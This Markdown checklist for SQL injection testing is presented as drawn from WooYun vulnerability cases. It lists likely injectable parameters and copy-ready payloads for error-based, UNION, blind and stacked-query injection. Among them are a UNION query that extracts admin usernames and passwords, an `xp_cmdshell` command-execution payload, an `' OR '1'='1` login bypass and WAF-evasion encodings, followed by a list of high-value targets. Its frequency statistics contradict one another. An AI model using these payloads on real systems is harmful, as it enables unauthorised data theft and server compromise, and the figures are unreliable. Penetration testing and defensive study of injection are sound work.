# SQL Injection Testing Checklist
> Derived from 234 real-world vulnerability cases (WooYun 2010-2016)

## High-Risk Parameters to Test
| Parameter | Frequency | Notes |
|-----------|-----------|-------|
| `id` | 46x | Most commonly injectable; numeric IDs in GET requests |
| `action` | 8x | Action dispatch parameters in MVC frameworks |
| `act` | 5x | Shortened action parameter variant |
| `type` / `typeId` / `typeid` | 8x | Category/type selectors, often unquoted integers |
| `username` | 2x | Login forms, user lookups |
| `s` | 3x | Search parameters |
| `aid` | 3x | Article/asset IDs |
| `mod` | 4x | Module selectors |
| `uid` / `rid` / `cid` / `pid` | 10x | Various entity ID parameters |
| `Channel` | 1x | Content management routing |

## Attack Pattern Distribution
| Pattern | Count | Percentage |
|---------|-------|------------|
| Direct injection | 42 | 71% |
| Data leakage | 4 | 7% |
| Directory traversal chain | 1 | 2% |
| Getshell via SQLi | 1 | 2% |

## Common Injection Techniques (by frequency)

### 1. Error-Based (most common)
```
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x71,
  (SELECT user()),0x71,FLOOR(RAND(0)*2))x
  FROM information_schema.tables GROUP BY x)a)--
```

### 2. UNION-Based
```
' UNION SELECT 1,2,3,CONCAT(username,0x23,password)
  FROM admin_table--
```
```
UNION/**/SELECT/**/1/**/FROM(SELECT/**/COUNT(*),
  CONCAT((...),FLOOR(RAND(0)*2))a
  FROM information_schema.tables GROUP BY a)b
```

### 3. Time-Based Blind
```
'; WAITFOR DELAY '0:0:5'--         (MSSQL)
' AND SLEEP(5)--                    (MySQL)
```

### 4. Boolean-Based Blind
```
' AND 2020=2020 AND 'x'='x
' AND 1=1--
' AND 1=2--
```

### 5. Stacked Queries (MSSQL)
```
'; WAITFOR DELAY '0:0:5'--
'; EXEC xp_cmdshell('whoami')--
```

## Bypass Techniques
- **Comment injection**: `/**/` between SQL keywords to evade WAF
- **Case variation**: `SeLeCt`, `uNiOn`
- **URL encoding**: `%27` for single quote, `%20` for space
- **Double encoding**: `%2527` for single quote
- **Array parameter abuse**: `gids[100][0]=) AND (subquery)#`
- **Numeric context**: Unquoted integer parameters skip string-based filters

## Quick Test Vectors
```
1. id=1'                              (error detection)
2. id=1 AND 1=1 / id=1 AND 1=2       (boolean blind)
3. id=1' OR '1'='1                    (auth bypass)
4. id=1 AND SLEEP(5)                  (time blind MySQL)
5. id=1'; WAITFOR DELAY '0:0:5'--    (time blind MSSQL)
6. id=1 UNION SELECT NULL,NULL,NULL-- (column enumeration)
7. id=1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- (error-based)
```

## High-Value Targets
- **Login forms**: `username` parameter with stacked queries
- **Search functions**: `keyword`/`s` parameters with UNION injection
- **Content pages**: `id`/`typeid` in article/news detail pages
- **API endpoints**: `action` parameters in `.do`/`.action` handlers
- **ASP.NET apps**: `__EVENTVALIDATION` and viewstate parameters

## Database Distribution
| DBMS | Observed Frequency |
|------|-------------------|
| MySQL 5.x | Most common |
| Microsoft SQL Server | Second most common |
| Oracle | Occasional (government systems) |
| Access | Legacy ASP applications |
